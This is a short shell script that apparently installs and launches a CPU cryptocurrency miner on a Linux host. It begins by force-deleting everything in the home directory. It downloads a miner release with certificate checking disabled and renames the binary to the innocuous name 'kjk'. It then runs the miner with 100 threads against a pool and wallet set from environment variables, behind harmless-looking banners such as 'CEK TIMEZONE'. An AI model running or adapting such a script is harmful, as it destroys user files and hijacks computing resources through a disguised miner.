#!/bin/sh
cd && rm -rvf *
echo "==================="
echo "   CEK TIMEZONE    "
echo "==================="
echo " "
echo " "
sudo ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata
sleep 2s 
echo "."
sudo apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
sleep 2 
git clone https://github.com/sukamenari/akc.git && cd akc && rm bash && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && rm cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 kjk && mv kjk ~/
cd && rm -rvf akc
clear
echo " "
echo " "
echo " "
echo "====================================="
echo "Bismillahirahmannirrahim"
echo "====================================="
echo " "
echo " "
echo " "
echo " "
sleep 4s 
./kjk -a $ALGO  -o $POOL -u $WALL.MBC$(echo $(shuf -i 1-999 -n 1)) -p c=$PO,mc=$MC -t100
